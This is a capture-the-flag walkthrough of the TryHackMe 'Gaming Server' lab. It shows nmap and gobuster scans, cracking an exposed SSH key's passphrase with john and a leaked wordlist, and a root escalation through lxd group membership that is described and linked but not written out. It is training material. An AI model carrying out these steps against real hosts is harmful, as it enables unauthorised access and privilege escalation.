
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Gaming_server/images/85-1.png)

This challenge was straighforward as i found a ssh key and logged into the ssh service and exploit the lxd group to escalate privileges to root.

As always, i started with a port scanning.

```text
nmap -sS -T4 -p- 10.10.93.162
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-08 05:05 EDT
Nmap scan report for 10.10.93.162
Host is up (0.052s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```
I did an in depth scan, it didn't revealed that much.

```text
 nmap -sV -sC -p22,80 10.10.93.162
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-08 05:10 EDT
Nmap scan report for 10.10.93.162
Host is up (0.050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I started enumeration on http service on the basic website with mostly lorem ipsum text.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Gaming_server/images/85-2.png)

The first page had this comment, from which i knew there is a user called john.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Gaming_server/images/85-3.png)

Draagan lore page has a different link which points to a uploads page.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Gaming_server/images/85-4.png)

The dict.lst contains a list of possible passwords. There is also  the ssh port open, this list may contain the real password of john.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Gaming_server/images/85-5.png)

Before jumping into this lead, i did a quick directory busting.
```text
 gobuster dir -u http://10.10.93.162 -w /usr/share/wordlists/dirb/common.txt T 250
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.93.162
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/08 05:14:54 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/robots.txt (Status: 200)
/secret (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
```

The secret page has a secret key which can be used to login to the ssh service.

![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Gaming_server/images/85-6.png)

The secretKey is encrypted, but i managed to extract the hash and crack it.

```text
john --format=SSH hash.secretKey --wordlist=dict.lst
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (secretKey)
```

I modified the permissions of the secretKey file and log into the service.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Gaming_server/images/85-7.png)

John is in the lxd group and this can be used to escalate privileges.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Gaming_server/images/85-8.png)

A very good explanation of what lxd is and how to escalate privileges is on this website: https://www.hackingarticles.in/lxd-privilege-escalation/. I followed the tutorial and read the flag from mnt/root.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Gaming_server/images/85-9.png)
